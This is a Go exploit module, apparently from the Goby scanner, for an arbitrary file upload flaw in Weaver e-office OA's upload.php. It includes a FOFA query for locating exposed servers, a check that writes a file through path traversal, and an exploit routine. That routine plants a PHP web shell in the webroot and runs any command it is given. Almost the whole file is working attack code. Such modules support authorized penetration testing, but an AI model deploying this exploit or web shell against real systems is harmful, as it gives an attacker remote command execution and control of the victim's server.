package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Weaver OA e-office upload file upload",
    "Description": "Weaver OA e-office upload.php file upload",
    "Impact": "Weaver OA e-office upload file upload",
    "Recommendation": "<p>1. The vulnerability has been officially fixed, please contact the manufacturer to fix the vulnerability: <a href=\"http://www.weaver.com.cn/\">http:// www.weaver.com.cn/</a></p><p>2. Set access policies and whitelist access through firewalls and other security devices. </p><p>3. If not necessary, prohibit public network from accessing the system. </p>",
    "Product": "Weaver-OA",
    "VulType": [
        "File Upload"
    ],
    "Tags": [
        "File Upload"
    ],
    "Translation": {
        "CN": {
            "Name": "泛微E-office OA系统upload.php 任意文件上传",
            "Description": "泛微E-office OA系统是面向中小型组织的专业协同OA软件，为企业用户提供专业OA办公系统、移动OA应用等协同OA整体解决方案。泛微E-office OA系统upload.php文件存在任意文件上传漏洞，攻击者可以通过该漏洞来上传恶意文件，执行任意操作系统命令，从而获取服务器权限。",
            "Impact": "<p>泛微E-office OA系统是面向中小型组织的专业协同OA软件，为企业用户提供专业OA办公系统、移动OA应用等协同OA整体解决方案。泛微E-office OA系统upload.php文件存在任意文件上传漏洞，攻击者可以通过该漏洞来上传恶意文件，执行任意操作系统命令，从而获取服务器权限。</p>",
            "Recommendation": "<p>1、官方已修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.weaver.com.cn/\" target=\"_blank\">http://www.weaver.com.cn/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Product": "泛微-EOffice",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Weaver OA e-office upload file upload",
            "Description": "Weaver OA e-office upload.php file upload",
            "Impact": "Weaver OA e-office upload file upload",
            "Recommendation": "<p>1. The vulnerability has been officially fixed, please contact the manufacturer to fix the vulnerability: <a href=\"http://www.weaver.com.cn/\" target=\"_blank\">http:// www.weaver.com.cn/</a></p><p>2. Set access policies and whitelist access through firewalls and other security devices. </p><p>3. If not necessary, prohibit public network from accessing the system. <br></p>",
            "Product": "Weaver-OA",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "FofaQuery": "(((header=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"Server: eOffice\") && body!=\"Server: couchdb\") || banner=\"general/login/index.php\")",
    "GobyQuery": "(((header=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"Server: eOffice\") && body!=\"Server: couchdb\") || banner=\"general/login/index.php\")",
    "Author": "go0p",
    "Homepage": "http://www.weaver.com.cn/",
    "DisclosureDate": "2021-04-09",
    "References": [],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "8.5",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [
            "EOffice"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10180"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randomFilename := goutils.RandomHexString(6)
			ramdomStrCheck := goutils.RandomHexString(20)
			vulUri := fmt.Sprintf("/newplugins/js/plupload-2.1.1/examples/upload.php?name=../../webroot/%s.txt", randomFilename)
			cfg := httpclient.NewPostRequestConfig(vulUri)
			cfg.VerifyTls = false
			cfg.Data = ramdomStrCheck
			if _, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				time.Sleep(time.Second * 1)
				if resp, err := httpclient.SimpleGet(u.FixedHostInfo + fmt.Sprintf("/%s.txt", randomFilename)); err == nil &&
					resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, ramdomStrCheck) {
					ss.VulURL = u.String() + fmt.Sprintf("/%s.txt", randomFilename)
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			randomFilename := goutils.RandomHexString(6)
			randomPwd := goutils.RandomHexString(3)
			webshell := fmt.Sprintf("<?php system($_GET[%s]);", randomPwd)
			vulUri := fmt.Sprintf("/newplugins/js/plupload-2.1.1/examples/upload.php?name=../../webroot/%s.php", randomFilename)
			cfg := httpclient.NewPostRequestConfig(vulUri)
			cfg.VerifyTls = false
			cfg.Data = webshell
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && resp.StatusCode == 200 {
				time.Sleep(time.Second * 1)
				if resp, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + fmt.Sprintf("/%s.php?%s=%s", randomFilename, randomPwd, cmd)); err == nil && resp.StatusCode == 200 {
					fmt.Println(expResult.HostInfo.FixedHostInfo + fmt.Sprintf("/%s.php?%s=%s", randomFilename, randomPwd, cmd))
					expResult.Success = true
					expResult.Output = resp.Utf8Html
				}
			}
			return expResult
		},
	))
}
